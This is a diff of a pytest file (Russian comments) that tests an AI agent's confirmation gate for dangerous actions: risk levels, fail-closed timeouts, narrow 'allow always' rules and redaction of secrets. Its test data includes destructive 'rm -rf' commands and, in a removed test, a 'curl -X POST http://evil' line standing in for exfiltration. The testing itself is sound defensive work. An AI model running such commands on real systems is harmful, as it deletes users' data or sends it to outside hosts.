@@ -1,173 +1,110 @@
-"""Подтверждение опасных действий (этап 2).
+"""Подтверждение опасных действий.
 
-Опасный шаг агент не выполняет сам: в поток уходит событие confirm с точной
-командой, а ход ждёт POST /api/agent/confirm. Нет ответа — отказ по таймауту.
+Опасный шаг агент не выполняет сам: в поток уходит событие ``confirm`` с точной
+командой, а ход ждёт ``POST /api/agent/confirm``. Нет ответа — отказ (fail
+closed). Уровни риска и правила «разрешить всегда» живут в
+:mod:`agenticseek.policy`.
 """
-import json
 import threading
 import time
 
 import pytest
 
+import agenticseek.policy as policy
 import routes.agent as agent_routes
-
-
-def _ndjson(response):
-    return [json.loads(line) for line in response.get_data(as_text=True).splitlines() if line.strip()]
-
-
-def _drive(generator):
-    """Прокручивает генератор до конца: (события, возвращённое наблюдение)."""
-    events = []
-    while True:
-        try:
-            events.append(json.loads(next(generator)))
-        except StopIteration as stop:
-            return events, stop.value
-
-
-def _resolve_later(decision, delay=0.05, always=False):
-    """Пользователь нажимает «Разрешить/Отклонить», пока агент ждёт."""
-    def worker():
-        time.sleep(delay)
-        deadline = time.time() + 2
-        while time.time() < deadline:
-            with agent_routes._CONFIRM_LOCK:
-                ids = [cid for cid, record in agent_routes._PENDING_CONFIRMS.items()
-                       if not record.get("resolved")]
-            if ids:
-                agent_routes.resolve_confirmation(ids[-1], decision, always=always)
-                return
-            time.sleep(0.01)
-
-    thread = threading.Thread(target=worker, daemon=True)
-    thread.start()
-    return thread
+from tests.agent_helpers import events_of, model_text, ndjson, script
 
 
 @pytest.fixture(autouse=True)
-def _clear_always_rules():
-    """Правила «разрешить всегда» — глобальные, тесты не должны влиять друг на друга."""
-    agent_routes.forget_always_allowed()
-    yield
-    agent_routes.forget_always_allowed()
+def _fresh_policy(monkeypatch):
+    """Правила и режим подтверждений — глобальные: тесты не влияют друг на друга."""
+    monkeypatch.delenv("AGENT_CONFIRM", raising=False)
+    monkeypatch.setenv("AGENT_CONFIRM_TIMEOUT", "0.3")
+    policy.reset_cache()
+    policy.forget_always_allowed()
+    try:
+        yield
+    finally:
+        policy.forget_always_allowed()
+        policy.reset_confirmations()
+        policy.reset_cache()
 
 
-@pytest.fixture
-def executed(monkeypatch):
-    """Подменяет выполнение шага, чтобы видеть, дошло ли до него дело."""
-    calls = []
-
-    def fake_perform(action, kind, use_tools, state, goal="", cancel=None):
-        calls.append({"kind": kind, "action": dict(action)})
-        return "ВЫПОЛНЕНО"
-        yield  # noqa: unreachable — генератор, как настоящий _perform
-
-    monkeypatch.setattr(agent_routes, "_perform", fake_perform)
-    return calls
+def _mode(monkeypatch, value):
+    monkeypatch.setenv("AGENT_CONFIRM", value)
+    policy.reset_cache()
 
 
 # ══════════════ оценка риска ══════════════
 
-def test_action_risk_by_kind_and_command():
-    assert agent_routes.action_risk("search", {"query": "x"}) == "safe"
-    assert agent_routes.action_risk("read", {"path": "a.txt"}) == "safe"
-    assert agent_routes.action_risk("write", {"path": "a.txt"}) == "write"
-    assert agent_routes.action_risk("run", {"command": "ls -la"}) == "write"
-    assert agent_routes.action_risk("run", {"command": "git push origin main"}) == "danger"
-    assert agent_routes.action_risk("run", {"command": "pip install requests"}) == "danger"
-    assert agent_routes.action_risk("mcp_call", {"server_id": "gh", "tool": "create_issue"}) == "danger"
+def test_risk_by_tool_and_command():
+    assert policy.risk_of("web_search", "asyncio") == "safe"
+    assert policy.risk_of("web_open", "https://example.org") == "safe"
+    assert policy.risk_of("file_finder", "name=notes.md") == "safe"
+    assert policy.risk_of("file_edit", '{"path": "a.py", "old": "a", "new": "b"}') == "write"
+    assert policy.risk_of("bash", "ls -la") == "write"
+    assert policy.risk_of("bash", "git push origin main") == "danger"
+    assert policy.risk_of("bash", "pip install requests") == "danger"
+    assert policy.risk_of("bash", "rm -rf build") == "danger"
+    assert policy.risk_of("mcp_call", '{"tool": "create_issue"}') == "danger"
+    assert policy.risk_of("mcp_call", '{"tool": "list_issues"}') == "safe"
 
 
-def test_confirmation_required_only_for_danger_by_default(monkeypatch):
-    monkeypatch.delenv("AGENT_CONFIRM", raising=False)
-    assert agent_routes.confirmation_needed("read", {"path": "x"}) is False
-    assert agent_routes.confirmation_needed("write", {"path": "x"}) is False
-    assert agent_routes.confirmation_needed("run", {"command": "git commit -m x"}) is True
+def test_only_danger_asks_by_default(monkeypatch):
+    _mode(monkeypatch, "danger")
+    assert policy.needs_confirmation("web_search", "x") is False
+    assert policy.needs_confirmation("bash", "ls") is False
+    assert policy.needs_confirmation("bash", "git commit -m x") is False
+    assert policy.needs_confirmation("bash", "git push origin main") is True
 
 
-def test_confirmation_mode_write_and_off(monkeypatch):
-    monkeypatch.setenv("AGENT_CONFIRM", "write")
-    assert agent_routes.confirmation_needed("write", {"path": "x"}) is True
-    monkeypatch.setenv("AGENT_CONFIRM", "off")
-    assert agent_routes.confirmation_needed("run", {"command": "git push"}) is False
+def test_modes_write_off(monkeypatch):
+    _mode(monkeypatch, "write")
+    assert policy.needs_confirmation("bash", "ls") is True
+    assert policy.needs_confirmation("file_edit", "x") is True
+    assert policy.needs_confirmation("web_search", "x") is False
+    _mode(monkeypatch, "off")
+    assert policy.needs_confirmation("bash", "git push") is False
 
 
-def test_confirmation_can_shown_command_and_arguments():
-    record = agent_routes.register_confirmation("run", {"action": "run", "command": "git push origin main"})
-    assert record["risk"] == "danger"
-    assert record["command"] == "git push origin main"
-    assert record["args"]["command"] == "git push origin main"
-    agent_routes.await_confirmation(record, timeout=0.01)
+def test_confirmation_record_describes_the_action():
+    record = policy.register_confirmation("bash", "git push origin main")
+    assert record["risk"] == "danger" and record["tool"] == "bash"
+    assert "git push origin main" in record["description"]
+    assert policy.await_confirmation(record, timeout=0.01) is False
 
 
-# ══════════════ пауза и продолжение ══════════════
-
-def test_dangerous_action_runs_after_approval(monkeypatch, executed):
-    monkeypatch.setenv("AGENT_CONFIRM", "danger")
-    state = {"notes": [], "sources": [], "tool_steps": 0}
-    _resolve_later(True)
-
-    events, observation = _drive(agent_routes._perform_guarded(
-        {"action": "run", "command": "git push origin main"}, "run", True, state))
-
-    confirm = next(event for event in events if event["type"] == "confirm")
-    assert confirm["tool"] == "run" and confirm["risk"] == "danger"
-    assert confirm["command"] == "git push origin main"
-    assert next(event for event in events if event["type"] == "confirm_result")["approved"] is True
-    assert observation == "ВЫПОЛНЕНО"
-    assert [call["kind"] for call in executed] == ["run"]
+def test_secrets_are_redacted_in_the_dialog():
+    text = policy.describe_action("bash", "curl -H 'Authorization: Bearer abcdef123456' x")
+    assert "abcdef123456" not in text and "***" in text
 
 
-def test_dangerous_action_skipped_when_denied(monkeypatch, executed):
-    monkeypatch.setenv("AGENT_CONFIRM", "danger")
-    state = {"notes": [], "sources": [], "tool_steps": 0}
-    _resolve_later(False)
+# ══════════════ ожидание ответа ══════════════
 
-    events, observation = _drive(agent_routes._perform_guarded(
-        {"action": "run", "command": "rm -rf notes"}, "run", True, state))
+def test_approval_unblocks_the_wait():
+    record = policy.register_confirmation("bash", "npm install left-pad")
 
-    assert next(event for event in events if event["type"] == "confirm_result")["approved"] is False
-    assert "ОТКЛОНИЛ" in observation
-    assert executed == []                       # ничего не выполнялось
-    assert any(event["type"] == "step" and "отклонено" in event["text"] for event in events)
+    def worker():
+        time.sleep(0.05)
+        policy.resolve_confirmation(record["id"], True)
+
+    threading.Thread(target=worker, daemon=True).start()
+    assert policy.await_confirmation(record, timeout=5) is True
 
 
-def test_dangerous_action_denied_by_timeout(monkeypatch, executed):
-    monkeypatch.setenv("AGENT_CONFIRM", "danger")
+def test_no_answer_means_refusal(monkeypatch):
     monkeypatch.setenv("AGENT_CONFIRM_TIMEOUT", "0.05")
-    state = {"notes": [], "sources": [], "tool_steps": 0}
+    record = policy.register_confirmation("bash", "npm install left-pad")
     started = time.time()
-
-    events, observation = _drive(agent_routes._perform_guarded(
-        {"action": "run", "command": "npm install left-pad"}, "run", True, state))
-
-    assert time.time() - started < 5            # не висим 120 секунд
-    assert next(event for event in events if event["type"] == "confirm_result")["approved"] is False
-    assert "ОТКЛОНИЛ" in observation and executed == []
+    assert policy.await_confirmation(record) is False
+    assert time.time() - started < 5
 
 
-def test_approved_action_is_not_asked_twice_in_one_turn(monkeypatch, executed):
-    monkeypatch.setenv("AGENT_CONFIRM", "danger")
-    state = {"notes": [], "sources": [], "tool_steps": 0, "approved": set()}
-    _resolve_later(True)
-    _drive(agent_routes._perform_guarded(
-        {"action": "run", "command": "git push"}, "run", True, state))
-
-    events, observation = _drive(agent_routes._perform_guarded(
-        {"action": "run", "command": "git push"}, "run", True, state))
-
-    assert not [event for event in events if event["type"] == "confirm"]
-    assert observation == "ВЫПОЛНЕНО"
-
-
-def test_safe_actions_are_never_confirmed(monkeypatch, executed):
-    monkeypatch.setenv("AGENT_CONFIRM", "write")
-    state = {"notes": [], "sources": [], "tool_steps": 0}
-    events, observation = _drive(agent_routes._perform_guarded(
-        {"action": "search", "query": "asyncio"}, "search", True, state))
-    assert not [event for event in events if event["type"] == "confirm"]
-    assert observation == "ВЫПОЛНЕНО"
+def test_same_confirmation_cannot_be_answered_twice():
+    record = policy.register_confirmation("bash", "git push")
+    assert policy.resolve_confirmation(record["id"], True) == (True, "ok")
+    assert policy.resolve_confirmation(record["id"], True) == (False, "already_resolved")
+    assert policy.resolve_confirmation("нет-такого", True) == (False, "not_found")
 
 
 # ══════════════ маршрут /api/agent/confirm ══════════════
@@ -184,121 +121,109 @@ def test_confirm_route_unknown_id(admin_client):
 
 
 def test_confirm_route_approves_and_rejects_repeat(admin_client):
-    record = agent_routes.register_confirmation("run", {"action": "run", "command": "git push"})
+    record = policy.register_confirmation("bash", "git push")
 
     first = admin_client.post("/api/agent/confirm", json={"id": record["id"], "approve": True})
     assert first.status_code == 200 and first.get_json()["approved"] is True
 
-    # повторное подтверждение того же id не должно выполнить действие второй раз
     second = admin_client.post("/api/agent/confirm", json={"id": record["id"], "approve": True})
     assert second.status_code == 409
     assert "обработано" in second.get_json()["error"]
 
 
+def test_confirm_route_can_store_always(admin_client):
+    record = policy.register_confirmation("bash", "npm install left-pad")
+    response = admin_client.post("/api/agent/confirm",
+                                 json={"id": record["id"], "approve": True, "always": True})
+    assert response.status_code == 200 and response.get_json()["always"] is True
+    assert policy.needs_confirmation("bash", "npm install left-pad") is False
+    assert policy.needs_confirmation("bash", "npm install right-pad") is True
+
+
 # ══════════════ «разрешить всегда» ══════════════
 
-def test_readonly_mcp_tools_do_not_ask(monkeypatch):
-    """web_search/web_fetch — чтение: разрешение на каждый вызов не нужно."""
-    monkeypatch.setenv("AGENT_CONFIRM", "danger")
-    for tool in ("web_search_exa", "web_fetch_exa", "list_issues", "get_page"):
-        action = {"action": "mcp_call", "server_id": "exa", "tool": tool}
-        assert agent_routes.action_risk("mcp_call", action) == "safe", tool
-        assert agent_routes.confirmation_needed("mcp_call", action) is False, tool
-    assert agent_routes.confirmation_needed(
-        "mcp_call", {"server_id": "gh", "tool": "create_issue"}) is True
-    # Похожие по подстроке, но изменяющие инструменты — по-прежнему опасные.
-    for tool in ("forget_password", "createIssue", "search_and_replace",
-                 "postgres_update"):
-        assert agent_routes.action_risk("mcp_call", {"tool": tool}) == "danger", tool
+def test_always_rule_is_narrow(monkeypatch):
+    _mode(monkeypatch, "danger")
+    record = policy.register_confirmation("bash", "git push origin main")
+    policy.resolve_confirmation(record["id"], True, always=True)
 
-
-def test_always_rule_covers_action_class_but_not_other_tools(monkeypatch):
-    monkeypatch.setenv("AGENT_CONFIRM", "danger")
-    first = {"action": "mcp_call", "server_id": "gh", "tool": "create_issue",
-             "arguments": {"title": "Первый"}}
-    record = agent_routes.register_confirmation("mcp_call", first)
-    assert agent_routes.confirmation_needed("mcp_call", first) is True
-
-    ok, reason = agent_routes.resolve_confirmation(record["id"], True, always=True)
-    assert ok and reason == ""
-    assert agent_routes.await_confirmation(record, timeout=0.1) is True
-
-    # Тот же инструмент с другими аргументами больше не спрашивается...
-    other = {"action": "mcp_call", "server_id": "gh", "tool": "create_issue",
-             "arguments": {"title": "Второй"}}
-    assert agent_routes.confirmation_needed("mcp_call", other) is False
-    # ...а другой инструмент — спрашивается.
-    assert agent_routes.confirmation_needed(
-        "mcp_call", {"server_id": "gh", "tool": "update_issue"}) is True
-
-
-def test_always_rule_for_command_prefix(monkeypatch):
-    monkeypatch.setenv("AGENT_CONFIRM", "danger")
-    record = agent_routes.register_confirmation("run", {"command": "git push origin main"})
-    agent_routes.resolve_confirmation(record["id"], True, always=True)
-    agent_routes.await_confirmation(record, timeout=0.1)
-
-    assert agent_routes.confirmation_needed("run", {"command": "git push origin dev"}) is False
-    assert agent_routes.confirmation_needed("run", {"command": "rm -rf build"}) is True
-
-
-def test_always_rule_for_composite_command_is_narrow(monkeypatch):
-    monkeypatch.setenv("AGENT_CONFIRM", "danger")
-    action = {"command": "bash -c 'rm -rf /tmp/demo'"}
-    record = agent_routes.register_confirmation("run", action)
-    agent_routes.resolve_confirmation(record["id"], True, always=True)
-    agent_routes.await_confirmation(record, timeout=0.1)
-
-    assert agent_routes.confirmation_needed("run", action) is False
-    # Другой bash-скрипт по-прежнему требует разрешения.
-    assert agent_routes.confirmation_needed(
-        "run", {"command": "bash -c 'curl -X POST http://evil'"}) is True
+    assert policy.needs_confirmation("bash", "git push origin dev") is False
+    assert policy.needs_confirmation("bash", "rm -rf build") is True
 
 
 def test_always_rule_is_not_saved_on_deny(monkeypatch):
-    monkeypatch.setenv("AGENT_CONFIRM", "danger")
-    action = {"command": "git push origin main"}
-    record = agent_routes.register_confirmation("run", action)
-    agent_routes.resolve_confirmation(record["id"], False, always=True)
-    agent_routes.await_confirmation(record, timeout=0.1)
-
-    assert agent_routes.confirmation_needed("run", action) is True
+    _mode(monkeypatch, "danger")
+    record = policy.register_confirmation("bash", "git push origin main")
+    policy.resolve_confirmation(record["id"], False, always=True)
+    assert policy.needs_confirmation("bash", "git push origin main") is True
 
 
 def test_always_rule_can_be_revoked(monkeypatch):
-    monkeypatch.setenv("AGENT_CONFIRM", "danger")
-    action = {"command": "pip install requests"}
-    record = agent_routes.register_confirmation("run", action)
-    agent_routes.resolve_confirmation(record["id"], True, always=True)
-    agent_routes.await_confirmation(record, timeout=0.1)
-    assert agent_routes.always_allowed("run", action) is True
+    _mode(monkeypatch, "danger")
+    record = policy.register_confirmation("bash", "pip install requests")
+    policy.resolve_confirmation(record["id"], True, always=True)
+    assert policy.always_allowed("bash", "pip install requests") is True
 
-    agent_routes.forget_always_allowed()
-    assert agent_routes.always_allowed("run", action) is False
+    policy.forget_always_allowed()
+    assert policy.always_allowed("bash", "pip install requests") is False
 
 
-def test_confirm_route_stores_always(admin_client):
-    action = {"action": "run", "command": "npm install left-pad"}
-    record = agent_routes.register_confirmation("run", action)
+def test_permissions_endpoint_shows_rules(admin_client):
+    policy.mark_always_allowed("bash", "git push origin main")
+    data = admin_client.get("/api/agent/permissions").get_json()
+    assert data["mode"] in ("off", "write", "danger")
+    assert {"tool": "bash", "match": "git push origin"} in data["rules"]
 
-    response = admin_client.post("/api/agent/confirm",
-                                 json={"id": record["id"], "approve": True, "always": True})
-    assert response.status_code == 200
-    assert response.get_json()["always"] is True
-    assert agent_routes.confirmation_needed("run", action) is False
+    admin_client.delete("/api/agent/permissions")
+    assert admin_client.get("/api/agent/permissions").get_json()["rules"] == []
 
 
-def test_perform_guarded_skips_confirm_after_always(monkeypatch, executed):
-    monkeypatch.setenv("AGENT_CONFIRM", "danger")
-    action = {"action": "run", "command": "git push origin main"}
-    record = agent_routes.register_confirmation("run", action)
-    agent_routes.resolve_confirmation(record["id"], True, always=True)
-    agent_routes.await_confirmation(record, timeout=0.1)
+# ══════════════ в потоке агента ══════════════
 
-    state = {"notes": [], "sources": [], "tool_steps": 0}
-    events, observation = _drive(agent_routes._perform_guarded(
-        action, "run", True, state))
+def test_dangerous_command_asks_and_runs_after_approval(admin_client, sandbox, monkeypatch):
+    _mode(monkeypatch, "danger")
+    monkeypatch.setattr(policy, "await_confirmation", lambda record, timeout=None: True)
+    script(monkeypatch, ["```bash\ngit push origin main\n```", "Отправил"])
 
-    assert not [event for event in events if event["type"] == "confirm"]
-    assert observation == "ВЫПОЛНЕНО"
-    assert [call["kind"] for call in executed] == ["run"]
+    events = ndjson(admin_client.post("/api/agent/stream",
+                                      json={"message": "запусти git push origin main"}))
+    confirm = events_of(events, "confirm")[0]
+    assert confirm["tool"] == "bash" and confirm["risk"] == "danger"
+    assert "git push origin main" in confirm["command"]
+    assert events_of(events, "confirm_result")[0]["approved"] is True
+    assert events_of(events, "tool")[0]["code"] in (0, 1)      # команда дошла до песочницы
+
+
+def test_denied_command_is_not_executed(admin_client, sandbox, monkeypatch):
+    _mode(monkeypatch, "danger")
+    monkeypatch.setattr(policy, "await_confirmation", lambda record, timeout=None: False)
+    seen = []
+    script(monkeypatch, ["```bash\ngit push origin main\n```", "Не отправлял"], seen)
+
+    events = ndjson(admin_client.post("/api/agent/stream",
+                                      json={"message": "запусти git push origin main"}))
+    assert events_of(events, "confirm_result")[0]["approved"] is False
+    assert events_of(events, "tool") == []
+    assert "запретил" in model_text(seen, -1).lower()
+
+
+def test_safe_actions_are_never_confirmed(admin_client, sandbox, monkeypatch):
+    _mode(monkeypatch, "write")
+    results = [{"title": "asyncio", "url": "https://example.org/a", "snippet": "…",
+                "host": "example.org"}]
+    monkeypatch.setattr(agent_routes, "nova_search",
+                        lambda query, limit=6: (results, {"backend": "test"}))
+    script(monkeypatch, ["```web_search\nasyncio\n```", "Готово"])
+
+    events = ndjson(admin_client.post("/api/agent/stream", json={"message": "найди asyncio"}))
+    assert events_of(events, "confirm") == []
+    assert events_of(events, "tool")[0]["name"] == "web_search"
+
+
+def test_confirm_off_skips_the_question(admin_client, sandbox, monkeypatch):
+    _mode(monkeypatch, "off")
+    script(monkeypatch, ["```bash\ngit push origin main\n```", "Отправил"])
+    events = ndjson(admin_client.post("/api/agent/stream",
+                                      json={"message": "запусти git push origin main"}))
+    assert events_of(events, "confirm") == []
+    assert events_of(events, "tool")[0]["name"] == "bash"
